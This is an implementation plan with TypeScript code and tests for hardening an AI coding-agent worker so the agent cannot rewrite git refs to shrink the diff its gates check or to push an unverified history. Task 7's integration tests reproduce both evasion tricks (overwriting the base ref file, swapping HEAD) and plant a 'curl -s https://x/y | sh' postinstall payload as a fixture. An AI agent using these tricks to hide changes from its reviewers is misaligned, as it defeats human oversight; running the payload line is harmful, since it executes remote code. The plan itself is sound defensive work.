# Gate Diff Integrity Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Stop every check the worker performs from naming a git ref, so the agent cannot rewrite the diff its own work is judged by.

**Architecture:** The base branch is resolved to a commit sha in the parent clone before the agent starts and held in the worker process; the worktree is created at that sha; gates compare two trees against it rather than walking a range; the run verifies that the commits between the base and HEAD are exactly the ones it made; and delivery pushes that commit by name instead of a branch.

**Tech Stack:** TypeScript (ESM, `.js` import specifiers), Node 22, vitest 3, real `git` through `worker/src/exec.ts`'s `Runner`.

**Spec:** `docs/superpowers/specs/2026-08-23-gate-diff-integrity-design.md`

## Global Constraints

- Worker source is ESM: every relative import ends in `.js`, including from `.ts` files.
- Every `git` invocation goes through the injected `Runner`, with `gitArgs()` and `GIT_SAFE_ENV` — never `child_process` directly. `delivery.ts` is the one exception and uses `hardenedGitConfig()` instead; do not change which one a module uses.
- No comments narrating what the code does. A comment earns its place only by explaining a non-obvious *why*, in the style already in these files.
- Tests run from `worker/`: `npm test`. Type-check both: `npm run build` and `npm run typecheck:tests`.
- Nothing in this plan may change behaviour for a run over an untampered checkout.

---

### Task 1: `commitAll` reports the sha it created

The run has to know its own commits to check them later, and this is the only place the worker commits.

**Files:**
- Modify: `worker/src/commit.ts`
- Test: `worker/src/commit.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces: `commitAll(runner, worktreePath, message): Promise<string>` — the new commit's sha, or `""` when the tree was clean and nothing was committed.

- [ ] **Step 1: Write the failing test**

Add to `worker/src/commit.test.ts`:

```ts
it("returns the sha it created", async () => {
  const runner = fakeRunner({
    "status --porcelain": { stdout: " M a.txt" },
    "rev-parse HEAD": { stdout: "abc123\n" },
  });
  expect(await commitAll(runner, "/wt", "BP-1: edit")).toBe("abc123");
});

it("returns an empty string when there was nothing to commit", async () => {
  const runner = fakeRunner({ "status --porcelain": { stdout: "" } });
  expect(await commitAll(runner, "/wt", "BP-1: edit")).toBe("");
});
```

Use whatever runner double the existing tests in this file already use; do not introduce a second one.

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/commit.test.ts`
Expected: FAIL — `commitAll` resolves to `undefined`.

- [ ] **Step 3: Implement**

In `worker/src/commit.ts`, change the signature to `Promise<string>`, return `""` at the early exit, and after the commit succeeds:

```ts
  const head = await git(["rev-parse", "HEAD"]);
  if (head.code !== 0) throw new Error(`git rev-parse failed: ${head.stderr || head.stdout}`);
  return head.stdout.trim();
```

- [ ] **Step 4: Run the tests**

Run: `cd worker && npx vitest run src/commit.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/commit.ts worker/src/commit.test.ts
git commit -m "refactor(worker): commitAll reports the sha it created"
```

---

### Task 2: the worktree is created at a captured base sha

**Files:**
- Modify: `worker/src/workspace.ts`
- Modify: `worker/src/pipeline.ts` (the `workspace.create` call site)
- Test: `worker/src/workspace.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces: `Workspace.create(taskKey, slug): Promise<Worktree>` where `export interface Worktree { path: string; baseSha: string }`. `pipeline.ts` holds `worktree.path` where it held `worktreePath`, and `worktree.baseSha` is what Task 3 and Task 5 read.

- [ ] **Step 1: Write the failing test**

```ts
it("creates the worktree at a sha resolved before the agent could run", async () => {
  const calls: string[][] = [];
  const runner = recordingRunner(calls, {
    "rev-parse --verify main^{commit}": { stdout: "base111\n" },
    "worktree list --porcelain": { stdout: "" },
  });
  const workspace = createWorkspace({ ...config, baseBranch: "main" }, runner);

  const result = await workspace.create("BP-1", "worker");

  expect(result.baseSha).toBe("base111");
  expect(calls).toContainEqual(
    expect.arrayContaining(["worktree", "add", "-B", "bp-1/worker", result.path, "base111"])
  );
});

it("refuses when the base branch does not resolve", async () => {
  const runner = recordingRunner([], {
    "rev-parse --verify main^{commit}": { code: 128, stderr: "unknown revision" },
    "worktree list --porcelain": { stdout: "" },
  });
  const workspace = createWorkspace({ ...config, baseBranch: "main" }, runner);
  await expect(workspace.create("BP-1", "worker")).rejects.toThrow(/base/i);
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/workspace.test.ts`
Expected: FAIL — `create` resolves to a string, and `worktree add` carries no commit-ish.

- [ ] **Step 3: Implement**

In `worker/src/workspace.ts`:

```ts
export interface Worktree {
  path: string;
  /** Resolved before the agent runs and held in this process: a ref name is rewritable by the run. */
  baseSha: string;
}

export interface Workspace {
  create(taskKey: string, slug: string): Promise<Worktree>;
  destroy(taskKey: string): Promise<void>;
  listWorktrees(): Promise<string[]>;
}
```

and inside `createWorkspace`'s returned object:

```ts
    async create(taskKey, slug) {
      const path = pathFor(taskKey);
      const branch = `${taskKey.toLowerCase()}/${slug}`;
      const baseSha = (await git(["rev-parse", "--verify", `${config.baseBranch}^{commit}`])).trim();

      await removeIfRegistered(path);
      await git(["worktree", "add", "-B", branch, path, baseSha]);
      return { path, baseSha };
    },
```

`git()` already throws on a non-zero exit, which is what makes the second test pass; no extra branch is needed.

In `worker/src/pipeline.ts`, change the creation block to:

```ts
  let worktree: Worktree;
  try {
    enter("worktree");
    worktree = await workspace.create(task.taskKey, SLUG);
  } catch (error) {
```

and replace every later use of `worktreePath` with `worktree.path`. Do not rename the variable in the reporter strings — the operator-facing text stays byte-identical.

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test`
Expected: PASS. `pipeline.test.ts` will need its workspace double updated to return an object; make that change in the same step.

- [ ] **Step 5: Commit**

```bash
git add worker/src/workspace.ts worker/src/workspace.test.ts worker/src/pipeline.ts worker/src/pipeline.test.ts
git commit -m "fix(worker): base the worktree on a sha captured before the agent runs (BP-382)"
```

---

### Task 3: the diff compares two trees

**Files:**
- Modify: `worker/src/diff.ts`
- Modify: `worker/src/pipeline.ts` (the `collectDiff` call)
- Test: `worker/src/diff.test.ts`

**Interfaces:**
- Consumes: `Worktree.baseSha` from Task 2.
- Produces: `collectDiff(runner, worktreePath, baseSha): Promise<DiffStats>` — unchanged arity, unchanged return type, third argument is now a sha and the comparison is direct.

- [ ] **Step 1: Write the failing test**

```ts
it("compares the two trees directly, so no history can narrow it", async () => {
  const calls: string[][] = [];
  const runner = recordingRunner(calls, { diff: { stdout: "" } });

  await collectDiff(runner, "/wt", "base111");

  const ranges = calls.filter((c) => c[0] === "diff").map((c) => c.slice(-2).join(" "));
  expect(ranges).toEqual(["base111 HEAD", "base111 HEAD"]);
  expect(calls.flat().join(" ")).not.toContain("...");
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/diff.test.ts`
Expected: FAIL — the arguments carry `base111...HEAD`.

- [ ] **Step 3: Implement**

In `worker/src/diff.ts`, replace the range with two arguments:

```ts
export async function collectDiff(
  runner: Runner,
  worktreePath: string,
  baseSha: string
): Promise<DiffStats> {
  const opts: RunOpts = { cwd: worktreePath, timeoutMs: GIT_TIMEOUT_MS };
  // Two trees, not a range: a merge-base is computed from history, and history is what the agent
  // rewrites to hide a file from this diff (BP-382).
  const numstatOutput = await git(runner, ["diff", "--numstat", baseSha, "HEAD"], opts);
  const { changedLines, changedFiles } = parseNumstat(numstatOutput);

  const patchOutput = await git(runner, ["diff", baseSha, "HEAD"], opts);
  const { patch, truncated } = boundPatch(patchOutput);

  return { changedLines, changedFiles, patch, truncated };
}
```

Delete the old three-dot comment; it now describes the opposite of what the code does.

In `worker/src/pipeline.ts`, the gate branch becomes:

```ts
        const diff = await deps.collectDiff(runner, worktree.path, worktree.baseSha);
```

and `PipelineDeps.collectDiff`'s parameter name changes from `baseBranch` to `baseSha`.

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/diff.ts worker/src/diff.test.ts worker/src/pipeline.ts
git commit -m "fix(worker): judge the diff against a captured sha, not a rewritable ref (BP-382)"
```

---

### Task 4: the run records the commits it made

**Files:**
- Modify: `worker/src/steps.ts`
- Test: `worker/src/steps.test.ts`

**Interfaces:**
- Consumes: `commitAll`'s return value from Task 1, through `StepContext.commit`.
- Produces: `RunState.commits: string[]` — the shas this run created, oldest first. `StepContext.commit(message): Promise<string>`. Task 5 reads `state.commits`.

- [ ] **Step 1: Write the failing test**

```ts
it("records every sha it commits, oldest first", async () => {
  const state = freshState();
  const ctx = contextWith({ state, commit: async () => "sha1" });

  await runStep(editEntry, ctx);

  expect(state.commits).toEqual(["sha1"]);
});

it("records nothing when the step committed nothing", async () => {
  const state = freshState();
  const ctx = contextWith({ state, commit: async () => "" });

  await runStep(editEntry, ctx);

  expect(state.commits).toEqual([]);
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/steps.test.ts`
Expected: FAIL — `RunState` has no `commits`.

- [ ] **Step 3: Implement**

In `worker/src/steps.ts`, add to `RunState`:

```ts
  /** Every sha this run created, oldest first. The only thing that commits here is commitAll. */
  commits: string[];
```

change `StepContext.commit` to `(message: string) => Promise<string>`, and in the edit branch:

```ts
    try {
      const sha = await ctx.commit(`${ctx.task.taskKey}: ${entry.name.toLowerCase()}`);
      if (sha) ctx.state.commits.push(sha);
      ctx.state.committed = true;
    } catch (error) {
      return { kind: "error", message: String(error) };
    }
```

In `worker/src/pipeline.ts`, add `commits: []` to the initial `state` literal. `commitAll` already matches the new `commit` type.

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/steps.ts worker/src/steps.test.ts worker/src/pipeline.ts
git commit -m "feat(worker): a run records the commits it made (BP-382)"
```

---

### Task 5: a run refuses to deliver a history it did not write

**Files:**
- Create: `worker/src/provenance.ts`
- Create: `worker/src/provenance.test.ts`
- Modify: `worker/src/steps.ts` (the `push` action)

**Interfaces:**
- Consumes: `RunState.commits` (Task 4), `Worktree.baseSha` (Task 2).
- Produces: `unexpectedHistory(runner, worktreePath, baseSha, expected: string[]): Promise<string>` — `""` when the commits between `baseSha` and `HEAD` are exactly `expected` and `HEAD` is the newest of them; otherwise a sentence naming the discrepancy, suitable for a board comment. `StepContext` gains `baseSha: string`.

- [ ] **Step 1: Write the failing test**

Create `worker/src/provenance.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { unexpectedHistory } from "./provenance.js";

const runnerFor = (revList: string, head: string, code = 0) => ({
  run: async (_c: string, args: string[]) =>
    args.includes("rev-list")
      ? { code, stdout: revList, stderr: "", timedOut: false }
      : { code: 0, stdout: head, stderr: "", timedOut: false },
});

describe("unexpectedHistory", () => {
  it("passes when the range holds exactly the run's own commits", async () => {
    const runner = runnerFor("sha2\nsha1\n", "sha2\n");
    expect(await unexpectedHistory(runner as never, "/wt", "base", ["sha1", "sha2"])).toBe("");
  });

  it("refuses a commit the run did not make", async () => {
    const runner = runnerFor("shaX\nsha2\nsha1\n", "shaX\n");
    const reason = await unexpectedHistory(runner as never, "/wt", "base", ["sha1", "sha2"]);
    expect(reason).toContain("shaX");
  });

  it("refuses a HEAD that is not the run's last commit", async () => {
    const runner = runnerFor("sha2\nsha1\n", "sha1\n");
    expect(await unexpectedHistory(runner as never, "/wt", "base", ["sha1", "sha2"])).toMatch(/HEAD/);
  });

  it("refuses when the range cannot be read at all", async () => {
    const runner = runnerFor("", "sha2\n", 128);
    expect(await unexpectedHistory(runner as never, "/wt", "base", ["sha1", "sha2"])).toMatch(/rev-list/);
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/provenance.test.ts`
Expected: FAIL — the module does not exist.

- [ ] **Step 3: Implement**

Create `worker/src/provenance.ts`:

```ts
import { childEnv } from "./env.js";
import { Runner } from "./exec.js";
import { GIT_SAFE_ENV, gitArgs } from "./git-safety.js";

const GIT_TIMEOUT_MS = 60_000;

// commitAll is the only thing in this worker that commits, so a run knows every sha it created.
// Anything else between the base and HEAD was put there by the thing being judged.
export async function unexpectedHistory(
  runner: Runner,
  worktreePath: string,
  baseSha: string,
  expected: string[]
): Promise<string> {
  const git = (args: string[]) =>
    runner.run("git", gitArgs(args), {
      cwd: worktreePath,
      timeoutMs: GIT_TIMEOUT_MS,
      env: { ...childEnv(), ...GIT_SAFE_ENV },
    });

  const range = await git(["rev-list", `${baseSha}..HEAD`]);
  if (range.code !== 0) {
    return `git rev-list ${baseSha}..HEAD failed: ${range.stderr || range.stdout}`;
  }

  const found = range.stdout.split("\n").map((line) => line.trim()).filter(Boolean);
  const mine = new Set(expected);
  const foreign = found.filter((sha) => !mine.has(sha));
  if (foreign.length > 0) {
    return `the branch carries ${foreign.length} commit(s) this run did not make (${foreign.join(", ")})`;
  }
  if (found.length !== expected.length) {
    return `the branch carries ${found.length} commit(s), but this run made ${expected.length}`;
  }

  const head = await git(["rev-parse", "HEAD"]);
  const newest = expected[expected.length - 1] ?? baseSha;
  if (head.stdout.trim() !== newest) {
    return `HEAD is ${head.stdout.trim() || "unreadable"}, not this run's last commit ${newest}`;
  }
  return "";
}
```

In `worker/src/steps.ts`, add `baseSha: string;` to `StepContext`, and guard the push:

```ts
    case "push": {
      const wrong = await unexpectedHistory(
        ctx.runner,
        ctx.worktreePath,
        ctx.baseSha,
        ctx.state.commits
      );
      if (wrong) return { kind: "error", message: `refusing to push: ${wrong}` };
      await ctx.delivery.push(ctx.worktreePath, ctx.branch, ctx.state.commits[ctx.state.commits.length - 1] ?? "");
      ctx.state.pushed = true;
      return { kind: "ok" };
    }
```

`StepContext` has no `runner` today — add `runner: Runner;` to it and pass `deps.runner` from `pipeline.ts`'s `runStep` call, alongside `baseSha: worktree.baseSha`.

An `error` from a deterministic step already sets `keepWorktree` and reports through `reporter.failed`, so a refusal here reaches the board with the reason and destroys nothing.

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/provenance.ts worker/src/provenance.test.ts worker/src/steps.ts worker/src/pipeline.ts
git commit -m "feat(worker): refuse to deliver a history the run did not write (BP-382)"
```

---

### Task 6: delivery pushes the commit, not the branch name

**Files:**
- Modify: `worker/src/delivery.ts`
- Test: `worker/src/delivery.test.ts`

**Interfaces:**
- Consumes: the sha from `RunState.commits` (Task 5).
- Produces: `Delivery.push(worktreePath, branch, commit): Promise<void>`. When `commit` is empty the push is refused rather than falling back to the branch name.

- [ ] **Step 1: Write the failing test**

```ts
it("pushes the commit into the branch, so the ref store cannot decide what is sent", async () => {
  const calls: string[][] = [];
  const delivery = createDelivery(recordingRunner(calls), "main");

  await delivery.push("/wt", "bp-1/worker", "sha999");

  const push = calls.find((c) => c[0] === "push")!;
  expect(push).toContain("sha999:refs/heads/bp-1/worker");
  expect(push).not.toContain("bp-1/worker");
});

it("refuses to push without a commit to name", async () => {
  const delivery = createDelivery(recordingRunner([]), "main");
  await expect(delivery.push("/wt", "bp-1/worker", "")).rejects.toThrow(/commit/i);
});
```

The second assertion of the first test is the point: the bare branch name must not appear as its own argument.

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/delivery.test.ts`
Expected: FAIL — the arguments end in `-- bp-1/worker`.

- [ ] **Step 3: Implement**

```ts
    async push(worktreePath, branch, commit) {
      if (!commit) throw new Error("refusing to push: no commit was named");
      await refuseIfPlanted(worktreePath);
      // <sha>:refs/heads/<branch>, because `git push -- <branch>` resolves the name in the shared
      // ref store — which the agent writes to — rather than sending what the run verified (BP-382).
      const result = await run(
        "git",
        [
          "push",
          "--no-verify",
          RECEIVE_PACK,
          "--force-with-lease",
          "-u",
          "origin",
          "--",
          `${commit}:refs/heads/${branch}`,
        ],
        worktreePath
      );
      if (result.code !== 0) throw failure("git push", result);
    },
```

Keep `--force-with-lease`: measured on 2026-08-23, it works with an explicit refspec both when the branch is new on the remote and when it is updated.

Update the `Delivery` interface and `pushFailure` in `pipeline.ts`, which calls `delivery.push` for the non-protected-paths gate rejection — it passes the newest recorded commit and, with none, reports the same "not pushed" message it already reports on a push failure.

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test`
Expected: PASS, including `delivery.hooks.integration.test.ts`, which pushes over a real transport.

- [ ] **Step 5: Commit**

```bash
git add worker/src/delivery.ts worker/src/delivery.test.ts worker/src/pipeline.ts
git commit -m "fix(worker): push the commit the run verified, not a branch name (BP-382)"
```

---

### Task 7: the two attacks, against real git

**Files:**
- Create: `worker/src/gate-integrity.integration.test.ts`

**Interfaces:**
- Consumes: everything above.
- Produces: nothing.

- [ ] **Step 1: Write the tests**

Real repositories, in the style of `delivery.hooks.integration.test.ts` — a mocked runner could only show that the arguments were spelled correctly.

```ts
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { protectedPathsGate } from "./gates/protected-paths.js";
import { createRunner } from "./exec.js";
import { createWorkspace } from "./workspace.js";

const git = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, stdio: "pipe" });

describe("a run's own diff cannot be narrowed from inside the worktree", () => {
  let dir: string;
  let parent: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-"));
    parent = join(dir, "parent");
    execFileSync("git", ["init", "-q", parent], { stdio: "pipe" });
    writeFileSync(join(parent, "package.json"), '{"name":"t"}\n');
    writeFileSync(join(parent, "README.md"), "# t\n");
    git(parent, "add", "-A");
    git(parent, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "initial");
    git(parent, "branch", "-M", "main");
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("still sees a protected file after the base ref is rewritten under it", async () => {
    const runner = createRunner();
    const workspace = createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as never,
      runner
    );
    const worktree = await workspace.create("BP-1", "worker");

    writeFileSync(
      join(worktree.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(worktree.path, "add", "-A");
    git(worktree.path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").toString().trim();

    // The attack, with nothing but a file write: a linked worktree's .git names the common dir,
    // and a loose ref beats packed-refs.
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(diff.changedFiles).toContain("package.json");
    expect(verdict.ok).toBe(false);
  });
});
```

- [ ] **Step 2: Run them**

Run: `cd worker && npx vitest run src/gate-integrity.integration.test.ts`
Expected: PASS.

- [ ] **Step 3: Prove the test is not vacuous**

A test that passes against the fix proves nothing until it has been seen to fail without it. Temporarily change `collectDiff`'s call in the test to pass the string `"main"` instead of `worktree.baseSha`, run again, and confirm it goes RED with `changedFiles` holding only `README.md`. Then restore it.

Run: `cd worker && npx vitest run src/gate-integrity.integration.test.ts`
Expected on the temporary edit: FAIL. Expected after restoring: PASS.

- [ ] **Step 4: Add the push half**

```ts
  it("sends the commit the run verified, not whatever the branch ref points at", async () => {
    const runner = createRunner();
    const origin = join(dir, "origin.git");
    execFileSync("git", ["init", "-q", "--bare", origin], { stdio: "pipe" });
    git(parent, "remote", "add", "origin", origin);

    const workspace = createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt2"), baseBranch: "main" } as never,
      runner
    );
    const worktree = await workspace.create("BP-2", "worker");

    writeFileSync(join(worktree.path, "README.md"), "# t\nbenign\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "benign");
    const benign = git(worktree.path, "rev-parse", "HEAD").toString().trim();

    writeFileSync(join(worktree.path, "package.json"), '{"scripts":{"postinstall":"sh -c x"}}\n');
    git(worktree.path, "add", "-A");
    git(worktree.path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").toString().trim();

    const common = readFileSync(join(worktree.path, ".git"), "utf8").replace("gitdir: ", "").trim();
    writeFileSync(join(common, "HEAD"), `${benign}\n`);
    writeFileSync(join(parent, ".git", "refs", "heads", "bp-2", "worker"), `${payload}\n`);

    const { unexpectedHistory } = await import("./provenance.js");
    const reason = await unexpectedHistory(runner, worktree.path, worktree.baseSha, [benign]);
    expect(reason).not.toBe("");
  });
```

The push itself is covered by Task 6's unit test and by `delivery.hooks.integration.test.ts`; what this asserts is that the detached-HEAD trick is caught before delivery is reached.

- [ ] **Step 5: Run everything and commit**

Run: `cd worker && npm test && npm run build && npm run typecheck:tests`
Expected: all green.

```bash
git add worker/src/gate-integrity.integration.test.ts
git commit -m "test(worker): the two ways a run could rewrite its own diff (BP-382)"
```

---

### Task 8: fetch the base before resolving it

Separable, and last on purpose: resolving the base to a sha closes the hole whether or not the sha is fresh. This fixes a different complaint — a parent clone left on some other ref means the run is judged against stale ground.

**Files:**
- Modify: `worker/src/workspace.ts`
- Modify: `worker/src/wiring.ts` (the two `createWorkspace` calls, lines 336 and 481)
- Test: `worker/src/workspace.test.ts`

**Interfaces:**
- Consumes: `hardenedGitConfig()` from `worker/src/delivery.ts`, and the pinned token `wiring.ts` already holds as `githubToken`.
- Produces: `createWorkspace(config, runner, remoteEnv?: () => NodeJS.ProcessEnv)`. Absent, the workspace behaves exactly as before Task 8.

- [ ] **Step 1: Write the failing test**

```ts
it("fetches the base before resolving it", async () => {
  const calls: string[][] = [];
  const runner = recordingRunner(calls, {
    "rev-parse --verify FETCH_HEAD^{commit}": { stdout: "fresh1\n" },
    "worktree list --porcelain": { stdout: "" },
  });
  const workspace = createWorkspace({ ...config, baseBranch: "main" }, runner, () => ({}));

  const result = await workspace.create("BP-1", "worker");

  expect(calls.map((c) => c.join(" "))).toContainEqual(
    expect.stringContaining("fetch --no-tags origin main")
  );
  expect(result.baseSha).toBe("fresh1");
});

it("falls back to the local ref when the fetch fails, rather than stopping the run", async () => {
  const runner = recordingRunner([], {
    fetch: { code: 1, stderr: "could not resolve host" },
    "rev-parse --verify main^{commit}": { stdout: "local1\n" },
    "worktree list --porcelain": { stdout: "" },
  });
  const workspace = createWorkspace({ ...config, baseBranch: "main" }, runner, () => ({}));

  expect((await workspace.create("BP-1", "worker")).baseSha).toBe("local1");
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd worker && npx vitest run src/workspace.test.ts`
Expected: FAIL — nothing fetches.

- [ ] **Step 3: Implement**

In `worker/src/workspace.ts`, take the optional env provider and resolve through `FETCH_HEAD` when a fetch succeeds:

```ts
  async function resolveBase(): Promise<string> {
    if (remoteEnv) {
      const fetched = await runner.run(
        "git",
        gitArgs(["fetch", "--no-tags", "origin", config.baseBranch]),
        {
          cwd: config.repoPath,
          timeoutMs: GIT_TIMEOUT_MS,
          env: { ...childEnv(["SSH_AUTH_SOCK", "GH_TOKEN", "GITHUB_TOKEN"]), ...remoteEnv() },
        }
      );
      if (fetched.code === 0) {
        return (await git(["rev-parse", "--verify", "FETCH_HEAD^{commit}"])).trim();
      }
    }
    return (await git(["rev-parse", "--verify", `${config.baseBranch}^{commit}`])).trim();
  }
```

A failed fetch is not fatal and is not silent: log it the way `refreshInventory` logs a failed inventory read, then fall through. The security property does not depend on the fetch — only freshness does.

In `worker/src/wiring.ts`, pass the provider at both call sites:

```ts
createWorkspace(taskConfig, deps.runner, () => ({
  ...hardenedGitConfig(),
  ...(githubToken ? { GH_TOKEN: githubToken, GITHUB_TOKEN: githubToken } : {}),
}))
```

- [ ] **Step 4: Run the tests**

Run: `cd worker && npm test && npm run build && npm run typecheck:tests`
Expected: all green.

- [ ] **Step 5: Commit**

```bash
git add worker/src/workspace.ts worker/src/workspace.test.ts worker/src/wiring.ts
git commit -m "feat(worker): fetch the base branch before a run is judged against it (BP-382)"
```

---

## Self-review notes

Checked against the spec: the base becomes a sha (Task 2), the diff compares trees (Task 3), the run verifies its own commits (Tasks 1, 4, 5), delivery names the commit (Task 6), the two attacks are reproduced against real git and the harness is checked for vacuity (Task 7), and the fetch is separable and non-fatal (Task 8). Agent confinement is out of scope in both documents.

Names used consistently throughout: `Worktree { path, baseSha }`, `RunState.commits`, `unexpectedHistory(...)`, `Delivery.push(worktreePath, branch, commit)`, `collectDiff(runner, worktreePath, baseSha)`.

One thing left for the implementer to confirm rather than assume: `worker/src/pipeline.ts` refers to `worktreePath` in several operator-facing strings. Those strings must not change — the change is where the value comes from, not what an operator reads.
